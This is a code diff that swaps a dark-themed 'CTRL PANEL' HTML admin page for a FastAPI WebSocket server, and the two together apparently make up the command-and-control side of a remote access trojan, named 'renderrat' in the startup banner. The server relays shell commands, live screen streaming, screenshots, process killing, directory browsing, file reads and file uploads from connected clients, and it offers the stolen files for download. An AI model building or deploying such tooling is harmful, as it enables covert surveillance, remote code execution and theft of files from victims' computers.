@@ -1,538 +1,397 @@
-<!DOCTYPE html>
-<html lang="vi">
-<head>
-<meta charset="UTF-8">
-<title>Admin Panel</title>
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;700;800&display=swap');
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
+from fastapi.responses import HTMLResponse, StreamingResponse
+import base64
+import io
+from fastapi.staticfiles import StaticFiles
+from fastapi.templating import Jinja2Templates
+from typing import Dict, Set
+import json
+import os
 
-  :root {
-    --bg:       #080b10;
-    --surface:  #0d1117;
-    --border:   #1a2233;
-    --accent:   #00e5ff;
-    --accent2:  #ff3366;
-    --green:    #00ff88;
-    --muted:    #3d4f66;
-    --text:     #c9d8ef;
-    --mono:     'JetBrains Mono', monospace;
-    --sans:     'Syne', sans-serif;
-  }
+app = FastAPI()
 
-  * { box-sizing: border-box; margin: 0; padding: 0; }
+# ===============================
+# TEMPLATES + STATIC
+# ===============================
 
-  body {
-    background: var(--bg);
-    color: var(--text);
-    font-family: var(--mono);
-    height: 100vh;
-    display: flex;
-    overflow: hidden;
-  }
+templates = Jinja2Templates(directory="templates")
 
-  /* SIDEBAR */
-  .sidebar {
-    width: 220px;
-    min-width: 220px;
-    background: var(--surface);
-    border-right: 1px solid var(--border);
-    display: flex;
-    flex-direction: column;
-  }
+if os.path.exists("static"):
+    app.mount("/static", StaticFiles(directory="static"), name="static")
 
-  .sidebar-header {
-    padding: 18px 16px 14px;
-    border-bottom: 1px solid var(--border);
-  }
+# ===============================
+# CONNECTIONS
+# ===============================
 
-  .logo {
-    font-family: var(--sans);
-    font-weight: 800;
-    font-size: 15px;
-    letter-spacing: 0.05em;
-    color: var(--accent);
-    display: flex;
-    align-items: center;
-    gap: 8px;
-  }
+clients: Dict[str, WebSocket] = {}
+admins: Set[WebSocket] = set()
 
-  .logo-dot {
-    width: 8px; height: 8px;
-    background: var(--accent);
-    border-radius: 50%;
-    box-shadow: 0 0 8px var(--accent);
-    animation: pulse 2s infinite;
-  }
+# Track which admin is watching which client (for stream routing)
+admin_watching: Dict[WebSocket, str] = {}   # admin_ws → client_id
 
-  @keyframes pulse {
-    0%, 100% { opacity: 1; transform: scale(1); }
-    50% { opacity: 0.4; transform: scale(0.6); }
-  }
+# File transfer buffer: transfer_id -> {filename, chunks, total_chunks, done}
+file_transfers: Dict[str, dict] = {}
 
-  .clients-label {
-    font-size: 10px;
-    color: var(--muted);
-    letter-spacing: 0.12em;
-    text-transform: uppercase;
-    margin-top: 14px;
-  }
+# ===============================
+# PAGES
+# ===============================
 
-  .client-list {
-    flex: 1;
-    overflow-y: auto;
-    padding: 10px;
-  }
+@app.get("/", response_class=HTMLResponse)
+async def admin_page(request: Request):
+    return templates.TemplateResponse("admin.html", {"request": request})
 
-  .client-list::-webkit-scrollbar { width: 3px; }
-  .client-list::-webkit-scrollbar-thumb { background: var(--border); }
-
-  .client-item {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    padding: 10px 12px;
-    border-radius: 8px;
-    cursor: pointer;
-    border: 1px solid transparent;
-    margin-bottom: 4px;
-    transition: background 0.12s, border-color 0.12s;
-  }
-
-  .client-item:hover { background: #111a28; }
-  .client-item.active { background: #0a1929; border-color: var(--accent); }
-
-  .client-dot {
-    width: 7px; height: 7px;
-    background: var(--green);
-    border-radius: 50%;
-    box-shadow: 0 0 6px var(--green);
-    flex-shrink: 0;
-  }
-
-  .client-id {
-    font-size: 14px;
-    font-weight: 600;
-  }
-
-  .no-clients {
-    color: var(--muted);
-    font-size: 12px;
-    text-align: center;
-    padding: 20px 0;
-  }
-
-  /* MAIN */
-  .main {
-    flex: 1;
-    display: flex;
-    flex-direction: column;
-    overflow: hidden;
-  }
-
-  /* TOPBAR */
-  .topbar {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    padding: 10px 14px;
-    border-bottom: 1px solid var(--border);
-    background: var(--surface);
-    flex-shrink: 0;
-  }
-
-  .btn {
-    font-family: var(--mono);
-    font-size: 12px;
-    font-weight: 600;
-    padding: 7px 14px;
-    border: 1px solid var(--border);
-    border-radius: 6px;
-    cursor: pointer;
-    background: transparent;
-    color: var(--text);
-    transition: all 0.12s;
-    white-space: nowrap;
-  }
-
-  .btn:hover { border-color: var(--accent); color: var(--accent); }
-
-  .btn.primary { background: var(--accent); border-color: var(--accent); color: #000; }
-  .btn.primary:hover { opacity: 0.85; }
-
-  .btn.stream-active { background: rgba(0,255,136,0.1); border-color: var(--green); color: var(--green); }
-
-  .cmd-input {
-    font-family: var(--mono);
-    font-size: 12px;
-    background: #0a1120;
-    border: 1px solid var(--border);
-    border-radius: 6px;
-    padding: 7px 12px;
-    color: var(--text);
-    outline: none;
-    flex: 1;
-    max-width: 340px;
-    transition: border 0.12s;
-  }
-  .cmd-input:focus { border-color: var(--accent); }
-  .cmd-input::placeholder { color: var(--muted); }
-
-  .divider { width: 1px; height: 20px; background: var(--border); margin: 0 2px; }
-
-  .stream-stats { display: flex; gap: 8px; align-items: center; }
-
-  .stat-badge {
-    background: #0d1a2a;
-    border: 1px solid var(--border);
-    border-radius: 4px;
-    padding: 3px 10px;
-    font-size: 11px;
-    font-weight: 600;
-    min-width: 64px;
-    text-align: center;
-    color: var(--muted);
-    transition: color 0.3s, border-color 0.3s;
-  }
-  .stat-badge.good { color: var(--green); border-color: rgba(0,255,136,0.3); }
-  .stat-badge.mid  { color: #ffbb00; border-color: rgba(255,187,0,0.3); }
-  .stat-badge.low  { color: var(--accent2); border-color: rgba(255,51,102,0.3); }
-
-  .status-pill {
-    display: flex;
-    align-items: center;
-    gap: 6px;
-    font-size: 11px;
-    color: var(--muted);
-    margin-left: auto;
-  }
-
-  .status-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--muted); }
-  .status-dot.on { background: var(--green); box-shadow: 0 0 5px var(--green); }
-
-  /* VIEWER */
-  .viewer {
-    flex: 1;
-    background: #04070d;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    position: relative;
-    overflow: hidden;
-  }
-
-  .screen-img {
-    max-width: 100%;
-    max-height: 100%;
-    object-fit: contain;
-    display: none;
-    border-radius: 3px;
-  }
-  .screen-img.show { display: block; }
-
-  .placeholder {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 14px;
-    color: var(--muted);
-  }
-  .ph-icon { font-size: 44px; opacity: 0.25; }
-  .ph-text { font-family: var(--sans); font-size: 13px; letter-spacing: 0.06em; }
-
-  .live-badge {
-    position: absolute;
-    top: 12px; left: 12px;
-    display: none;
-    align-items: center;
-    gap: 6px;
-    background: rgba(0,0,0,0.65);
-    border: 1px solid rgba(0,255,136,0.35);
-    border-radius: 20px;
-    padding: 4px 12px 4px 8px;
-    font-size: 11px;
-    color: var(--green);
-    font-weight: 700;
-    backdrop-filter: blur(6px);
-    letter-spacing: 0.08em;
-  }
-  .live-badge.show { display: flex; }
-  .rec { width: 7px; height: 7px; background: var(--green); border-radius: 50%; animation: blink 1s step-end infinite; }
-  @keyframes blink { 50% { opacity: 0; } }
-
-  /* OUTPUT */
-  .output-panel {
-    height: 150px;
-    background: var(--surface);
-    border-top: 1px solid var(--border);
-    padding: 10px 14px;
-    overflow-y: auto;
-    font-size: 11.5px;
-    line-height: 1.65;
-    flex-shrink: 0;
-  }
-  .output-panel::-webkit-scrollbar { width: 3px; }
-  .output-panel::-webkit-scrollbar-thumb { background: var(--border); }
-
-  .log { color: #5a7a99; }
-  .log.info   { color: var(--accent); }
-  .log.result { color: var(--green); }
-  .log.error  { color: var(--accent2); }
-  .log.ts     { color: var(--muted); font-size: 10px; }
-</style>
-</head>
-<body>
-
-<div class="sidebar">
-  <div class="sidebar-header">
-    <div class="logo"><span class="logo-dot"></span>CTRL PANEL</div>
-    <div class="clients-label">Online Clients</div>
-  </div>
-  <div class="client-list" id="clientList">
-    <div class="no-clients">No clients online</div>
-  </div>
-</div>
-
-<div class="main">
-  <div class="topbar">
-    <button class="btn primary" id="streamBtn" onclick="toggleStream()">▶ Live Stream</button>
-    <button class="btn" onclick="requestScreenshot()">⎙ Snapshot</button>
-    <div class="divider"></div>
-    <input class="cmd-input" id="cmdInput" placeholder="Shell command…"
-           onkeydown="if(event.key==='Enter')sendCommand()">
-    <button class="btn" onclick="sendCommand()">Run</button>
-    <div class="divider"></div>
-    <div class="stream-stats">
-      <div class="stat-badge" id="fpsBadge">-- FPS</div>
-      <div class="stat-badge" id="latBadge">-- ms</div>
-    </div>
-    <div class="status-pill">
-      <div class="status-dot" id="statusDot"></div>
-      <span id="statusText">Connecting…</span>
-    </div>
-  </div>
-
-  <div class="viewer">
-    <div class="placeholder" id="placeholder">
-      <div class="ph-icon">🖥</div>
-      <div class="ph-text">Select a client to begin</div>
-    </div>
-    <img class="screen-img" id="screenImg" alt="">
-    <div class="live-badge" id="liveBadge"><div class="rec"></div>LIVE</div>
-  </div>
-
-  <div class="output-panel" id="output">
-    <div class="log info">[SYSTEM] Panel ready</div>
-  </div>
-</div>
-
-<script>
-  let selectedClient = null;
-  let isStreaming     = false;
-  let frameCount      = 0;
-  let fpsTimer        = null;
-  let lastFrameTime   = 0;
-
-  const ws = new WebSocket(
-    (location.protocol === 'https:' ? 'wss:' : 'ws:') + '//' + location.host + '/ws/admin'
-  );
-
-  const $clientList = document.getElementById('clientList');
-  const $screenImg  = document.getElementById('screenImg');
-  const $ph         = document.getElementById('placeholder');
-  const $statusDot  = document.getElementById('statusDot');
-  const $statusTxt  = document.getElementById('statusText');
-  const $streamBtn  = document.getElementById('streamBtn');
-  const $liveBadge  = document.getElementById('liveBadge');
-  const $fpsBadge   = document.getElementById('fpsBadge');
-  const $latBadge   = document.getElementById('latBadge');
-  const $output     = document.getElementById('output');
-
-  ws.onopen = () => {
-    $statusDot.classList.add('on');
-    $statusTxt.textContent = 'Connected';
-    log('WebSocket connected', 'info');
-  };
-
-  ws.onclose = () => {
-    $statusDot.classList.remove('on');
-    $statusTxt.textContent = 'Disconnected';
-    _stopStream(false);
-    log('WebSocket disconnected', 'error');
-  };
-
-  ws.onmessage = ({ data }) => {
-    let msg;
-    try { msg = JSON.parse(data); } catch { return; }
-
-    const { type, client_id } = msg;
-
-    if (type === 'clients') {
-      renderClients(msg.clients);
-      return;
+@app.get("/health")
+async def health_check():
+    return {
+        "status": "healthy",
+        "clients_online": len(clients),
+        "admins_online": len(admins)
     }
 
-    if (type === 'client_info' && client_id === selectedClient) {
-      const s = msg.sysinfo || {};
-      log(`[#${client_id}] ${s.platform} | CPU ${s.cpu_percent}% | RAM ${s.memory_percent}%`, 'info');
-      return;
-    }
+# ===============================
+# FILE DOWNLOAD ENDPOINT
+# ===============================
 
-    if (type === 'stream_frame' && client_id === selectedClient) {
-      const now = performance.now();
-      if (lastFrameTime) {
-        $latBadge.textContent = Math.round(now - lastFrameTime) + ' ms';
-      }
-      lastFrameTime = now;
-      frameCount++;
-      $screenImg.src = 'data:image/jpeg;base64,' + msg.image;
-      showScreen();
-      return;
-    }
+@app.get("/download/{transfer_id}")
+async def download_file(transfer_id: str):
+    """Admin download file đã nhận từ Client qua HTTP GET."""
+    t = file_transfers.get(transfer_id)
+    if not t:
+        return HTMLResponse("<h3>File not found or expired</h3>", status_code=404)
+    if not t.get("done"):
+        return HTMLResponse("<h3>File transfer not complete yet</h3>", status_code=425)
 
-    if (type === 'screenshot' && client_id === selectedClient) {
-      $screenImg.src = 'data:image/jpeg;base64,' + msg.image;
-      showScreen();
-      log(`[#${client_id}] Snapshot received`, 'info');
-      return;
-    }
+    # Ghép chunks
+    buffer = io.BytesIO()
+    for i in range(t["total_chunks"]):
+        chunk = t["chunks"].get(i, "")
+        buffer.write(base64.b64decode(chunk))
+    buffer.seek(0)
 
-    if (type === 'command_result' && client_id === selectedClient) {
-      log(msg.output, 'result');
-      return;
-    }
+    filename = t["filename"]
+    return StreamingResponse(
+        buffer,
+        media_type="application/octet-stream",
+        headers={"Content-Disposition": f'attachment; filename="{filename}"'}
+    )
 
-    if (type === 'stream_stopped' && client_id === selectedClient) {
-      _stopStream(false);
-      log(`[#${client_id}] Stream stopped: ${msg.reason}`, 'error');
-      return;
-    }
-  };
+# ===============================
+# CLIENT WEBSOCKET
+# ===============================
 
-  // ── Client list ───────────────────────────────────────────
-  function renderClients(clients) {
-    if (!clients.length) {
-      $clientList.innerHTML = '<div class="no-clients">No clients online</div>';
-      if (selectedClient) { selectedClient = null; _stopStream(false); hideScreen(); }
-      return;
-    }
+@app.websocket("/ws/client/{client_id}")
+async def client_ws(websocket: WebSocket, client_id: str):
+    await websocket.accept()
+    clients[client_id] = websocket
+    print(f"[CLIENT +] {client_id} | Total: {len(clients)}")
+    await notify_admins_clients()
 
-    $clientList.innerHTML = '';
-    clients.forEach(id => {
-      const div = document.createElement('div');
-      div.className = 'client-item' + (id === selectedClient ? ' active' : '');
-      div.innerHTML = `<div class="client-dot"></div><div class="client-id">#${id}</div>`;
-      div.onclick = () => selectClient(id);
-      $clientList.appendChild(div);
-    });
-  }
+    try:
+        while True:
+            data = await websocket.receive_text()
+            message = json.loads(data)
+            msg_type = message.get("type")
 
-  function selectClient(id) {
-    if (id === selectedClient) return;
+            # ── Stream frame — forward nhanh nhất có thể ──────────
+            if msg_type == "stream_frame":
+                await broadcast_stream_frame(client_id, {
+                    "type": "stream_frame",
+                    "client_id": client_id,
+                    "image": message.get("image"),
+                    "ts": message.get("ts")
+                })
 
-    // Stop stream trên client cũ
-    if (isStreaming && selectedClient) {
-      ws.send(JSON.stringify({ type: 'stop_stream', client_id: selectedClient }));
-      isStreaming = false;
-    }
+            # ── Screenshot ────────────────────────────────────────
+            elif msg_type == "screenshot":
+                await broadcast_to_admins({
+                    "type": "screenshot",
+                    "client_id": client_id,
+                    "image": message.get("image")
+                })
 
-    selectedClient = id;
+            # ── Command result ────────────────────────────────────
+            elif msg_type == "command_result":
+                await broadcast_to_admins({
+                    "type": "command_result",
+                    "client_id": client_id,
+                    "output": message.get("output")
+                })
 
-    document.querySelectorAll('.client-item').forEach(el => {
-      el.classList.toggle('active', el.querySelector('.client-id').textContent === '#' + id);
-    });
+            # ── File transfer: Client → Admin ─────────────────────
+            elif msg_type in ("file_transfer_start", "file_chunk", "file_transfer_done", "file_transfer_error"):
+                transfer_id = message.get("transfer_id")
 
-    log(`[SELECTED] #${id}`, 'info');
-    startStream(); // auto-stream khi chọn client
-  }
+                if msg_type == "file_transfer_start":
+                    file_transfers[transfer_id] = {
+                        "filename": message.get("filename"),
+                        "file_size": message.get("file_size"),
+                        "total_chunks": message.get("total_chunks"),
+                        "chunks": {},
+                        "done": False,
+                        "client_id": client_id
+                    }
+                elif msg_type == "file_chunk":
+                    if transfer_id in file_transfers:
+                        file_transfers[transfer_id]["chunks"][message.get("chunk_idx")] = message.get("data")
+                elif msg_type == "file_transfer_done":
+                    if transfer_id in file_transfers:
+                        file_transfers[transfer_id]["done"] = True
+                        print(f"[FILE] Transfer done: {message.get('filename')} ({message.get('file_size')} bytes)")
 
-  // ── Stream ────────────────────────────────────────────────
-  function toggleStream() {
-    if (isStreaming) _stopStream(true);
-    else startStream();
-  }
+                # Relay progress đến admin
+                await broadcast_to_admins({
+                    "type": msg_type,
+                    "client_id": client_id,
+                    "transfer_id": transfer_id,
+                    "filename": message.get("filename"),
+                    "file_size": message.get("file_size"),
+                    "total_chunks": message.get("total_chunks"),
+                    "chunk_idx": message.get("chunk_idx"),
+                    "error": message.get("error")
+                })
 
-  function startStream() {
-    if (!selectedClient) { log('Select a client first', 'error'); return; }
-    if (isStreaming) return;
+            # ── File save result (Admin → Client download kết quả) ─
+            elif msg_type == "file_save_result":
+                await broadcast_to_admins({
+                    "type": "file_save_result",
+                    "client_id": client_id,
+                    "transfer_id": message.get("transfer_id"),
+                    "path": message.get("path"),
+                    "error": message.get("error")
+                })
 
-    ws.send(JSON.stringify({ type: 'start_stream', client_id: selectedClient }));
-    isStreaming   = true;
-    frameCount    = 0;
-    lastFrameTime = 0;
+            # ── Client connected (sysinfo) ─────────────────────────
+            elif msg_type == "client_connected":
+                await broadcast_to_admins({
+                    "type": "client_info",
+                    "client_id": client_id,
+                    "sysinfo": message.get("sysinfo")
+                })
 
-    $streamBtn.textContent = '⏹ Stop Stream';
-    $streamBtn.className = 'btn stream-active';
-    $liveBadge.classList.add('show');
+            # ── Other data (sysinfo, processes, files…) ───────────
+            else:
+                await broadcast_to_admins({
+                    "type": msg_type,
+                    "client_id": client_id,
+                    "data": message.get("data"),
+                    "result": message.get("result"),
+                    "path": message.get("path")
+                })
 
-    // FPS counter — cập nhật mỗi giây
-    fpsTimer = setInterval(() => {
-      const fps = frameCount;
-      frameCount = 0;
-      $fpsBadge.textContent = fps + ' FPS';
-      $fpsBadge.className = 'stat-badge ' + (fps >= 15 ? 'good' : fps >= 8 ? 'mid' : 'low');
-    }, 1000);
+    except WebSocketDisconnect:
+        pass
+    except Exception as e:
+        print(f"[CLIENT ERR] {client_id}: {e}")
+    finally:
+        if client_id in clients:
+            del clients[client_id]
+        # Dừng stream cho các admin đang xem client này
+        await stop_stream_for_client(client_id)
+        print(f"[CLIENT -] {client_id} | Total: {len(clients)}")
+        await notify_admins_clients()
 
-    log(`[STREAM] Started → #${selectedClient}`, 'info');
-  }
+# ===============================
+# ADMIN WEBSOCKET
+# ===============================
 
-  function _stopStream(sendMsg) {
-    if (sendMsg && selectedClient) {
-      try { ws.send(JSON.stringify({ type: 'stop_stream', client_id: selectedClient })); } catch {}
-    }
-    isStreaming = false;
-    clearInterval(fpsTimer);
-    fpsTimer = null;
-    frameCount = 0;
+@app.websocket("/ws/admin")
+async def admin_ws(websocket: WebSocket):
+    await websocket.accept()
+    admins.add(websocket)
+    print(f"[ADMIN +] Total: {len(admins)}")
+    await notify_admins_clients()
 
-    $streamBtn.textContent = '▶ Live Stream';
-    $streamBtn.className = 'btn primary';
-    $liveBadge.classList.remove('show');
-    $fpsBadge.textContent = '-- FPS';
-    $fpsBadge.className = 'stat-badge';
-    $latBadge.textContent = '-- ms';
-  }
+    try:
+        while True:
+            data = await websocket.receive_text()
+            message = json.loads(data)
+            msg_type = message.get("type")
+            client_id = message.get("client_id")
 
-  // ── Actions ───────────────────────────────────────────────
-  function requestScreenshot() {
-    if (!selectedClient) { log('Select a client first', 'error'); return; }
-    ws.send(JSON.stringify({ type: 'request_screenshot', client_id: selectedClient }));
-  }
+            # ── Stream control ────────────────────────────────────
+            if msg_type == "start_stream":
+                if client_id and client_id in clients:
+                    admin_watching[websocket] = client_id
+                    await clients[client_id].send_text(json.dumps({
+                        "type": "start_stream"
+                    }))
+                    print(f"[STREAM] Admin started stream → {client_id}")
 
-  function sendCommand() {
-    if (!selectedClient) { log('Select a client first', 'error'); return; }
-    const cmd = document.getElementById('cmdInput').value.trim();
-    if (!cmd) return;
-    ws.send(JSON.stringify({ type: 'command', client_id: selectedClient, command: cmd }));
-    log('$ ' + cmd, 'log');
-    document.getElementById('cmdInput').value = '';
-  }
+            elif msg_type == "stop_stream":
+                if client_id and client_id in clients:
+                    if websocket in admin_watching:
+                        del admin_watching[websocket]
+                    # Dừng stream nếu không còn admin nào xem
+                    watchers = [a for a, c in admin_watching.items() if c == client_id]
+                    if not watchers:
+                        await clients[client_id].send_text(json.dumps({
+                            "type": "stop_stream"
+                        }))
+                    print(f"[STREAM] Admin stopped stream → {client_id}")
 
-  // ── UI ────────────────────────────────────────────────────
-  function showScreen() {
-    $screenImg.classList.add('show');
-    $ph.style.display = 'none';
-  }
+            # ── Screenshot ────────────────────────────────────────
+            elif msg_type == "request_screenshot":
+                if client_id in clients:
+                    await clients[client_id].send_text(json.dumps({
+                        "type": "request_screenshot",
+                        "quality": message.get("quality", 85)
+                    }))
 
-  function hideScreen() {
-    $screenImg.classList.remove('show');
-    $ph.style.display = 'flex';
-  }
+            # ── Command ───────────────────────────────────────────
+            elif msg_type == "command":
+                if client_id in clients:
+                    await clients[client_id].send_text(json.dumps({
+                        "type": "command",
+                        "command": message.get("command")
+                    }))
 
-  function log(msg, cls = '') {
-    const ts = document.createElement('div');
-    ts.className = 'log ts';
-    ts.textContent = new Date().toLocaleTimeString();
+            # ── Sysinfo ───────────────────────────────────────────
+            elif msg_type == "request_sysinfo":
+                if client_id in clients:
+                    await clients[client_id].send_text(json.dumps({"type": "request_sysinfo"}))
 
-    const el = document.createElement('div');
-    el.className = 'log ' + cls;
-    el.textContent = msg;
+            # ── Processes ─────────────────────────────────────────
+            elif msg_type == "request_processes":
+                if client_id in clients:
+                    await clients[client_id].send_text(json.dumps({"type": "request_processes"}))
 
-    $output.append(ts, el);
-    $output.scrollTop = $output.scrollHeight;
+            elif msg_type == "kill_process":
+                if client_id in clients:
+                    await clients[client_id].send_text(json.dumps({
+                        "type": "kill_process",
+                        "pid": message.get("pid")
+                    }))
 
-    // Trim log
-    while ($output.children.length > 300) $output.removeChild($output.firstChild);
-  }
-</script>
-</body>
-</html>
+            # ── Files ─────────────────────────────────────────────
+            elif msg_type == "list_directory":
+                if client_id in clients:
+                    await clients[client_id].send_text(json.dumps({
+                        "type": "list_directory",
+                        "path": message.get("path", ".")
+                    }))
+
+            elif msg_type == "read_file":
+                if client_id in clients:
+                    await clients[client_id].send_text(json.dumps({
+                        "type": "read_file",
+                        "path": message.get("path")
+                    }))
+
+            # ── File: Admin yêu cầu Client gửi file lên ───────────
+            elif msg_type == "request_file_upload":
+                if client_id in clients:
+                    import uuid as _uuid
+                    transfer_id = message.get("transfer_id") or str(_uuid.uuid4())[:8]
+                    await clients[client_id].send_text(json.dumps({
+                        "type": "request_file_upload",
+                        "path": message.get("path"),
+                        "transfer_id": transfer_id
+                    }))
+                    print(f"[FILE] Request upload: {message.get('path')} from {client_id}")
+
+            # ── File: Admin gửi file xuống Client ─────────────────
+            elif msg_type == "send_file_to_client":
+                if client_id in clients:
+                    # Forward toàn bộ file_transfer_start + chunks + done
+                    await clients[client_id].send_text(json.dumps({
+                        "type": "file_transfer_start",
+                        "transfer_id": message.get("transfer_id"),
+                        "filename": message.get("filename"),
+                        "file_size": message.get("file_size"),
+                        "total_chunks": message.get("total_chunks"),
+                        "save_dir": message.get("save_dir", ".")
+                    }))
+
+            elif msg_type in ("send_chunk_to_client",):
+                if client_id in clients:
+                    await clients[client_id].send_text(json.dumps({
+                        "type": "file_chunk",
+                        "transfer_id": message.get("transfer_id"),
+                        "chunk_idx": message.get("chunk_idx"),
+                        "total_chunks": message.get("total_chunks"),
+                        "data": message.get("data")
+                    }))
+
+            elif msg_type == "finish_file_to_client":
+                if client_id in clients:
+                    await clients[client_id].send_text(json.dumps({
+                        "type": "file_transfer_done",
+                        "transfer_id": message.get("transfer_id"),
+                        "filename": message.get("filename"),
+                        "file_size": message.get("file_size")
+                    }))
+
+    except WebSocketDisconnect:
+        pass
+    except Exception as e:
+        print(f"[ADMIN ERR] {e}")
+    finally:
+        admins.discard(websocket)
+        # Dừng stream nếu admin đang xem
+        if websocket in admin_watching:
+            client_id = admin_watching.pop(websocket)
+            watchers = [a for a, c in admin_watching.items() if c == client_id]
+            if not watchers and client_id in clients:
+                await clients[client_id].send_text(json.dumps({"type": "stop_stream"}))
+        print(f"[ADMIN -] Total: {len(admins)}")
+
+# ===============================
+# HELPERS
+# ===============================
+
+async def notify_admins_clients():
+    await broadcast_to_admins({
+        "type": "clients",
+        "clients": list(clients.keys())
+    })
+
+async def broadcast_to_admins(message: dict):
+    dead = set()
+    for admin in admins:
+        try:
+            await admin.send_text(json.dumps(message))
+        except Exception:
+            dead.add(admin)
+    for d in dead:
+        admins.discard(d)
+
+async def broadcast_stream_frame(client_id: str, message: dict):
+    """Chỉ gửi stream frame cho admin đang xem client này"""
+    dead = set()
+    watchers = [admin for admin, cid in admin_watching.items() if cid == client_id]
+    payload = json.dumps(message)
+    for admin in watchers:
+        try:
+            await admin.send_text(payload)
+        except Exception:
+            dead.add(admin)
+    for d in dead:
+        admins.discard(d)
+        admin_watching.pop(d, None)
+
+async def stop_stream_for_client(client_id: str):
+    """Notify admins đang xem client vừa disconnect"""
+    watching_admins = [a for a, c in admin_watching.items() if c == client_id]
+    for admin in watching_admins:
+        admin_watching.pop(admin, None)
+        try:
+            await admin.send_text(json.dumps({
+                "type": "stream_stopped",
+                "client_id": client_id,
+                "reason": "client_disconnected"
+            }))
+        except Exception:
+            pass
+
+# ===============================
+# STARTUP
+# ===============================
+
+@app.on_event("startup")
+async def startup_event():
+    print("=" * 50)
+    print("  Server Started!")
+    print("=" * 50)
+    print("  Admin : https://renderrat.onrender.com")
+    print("  Client: wss://renderrat.onrender.com/ws/client/{id}")
+    print("=" * 50)
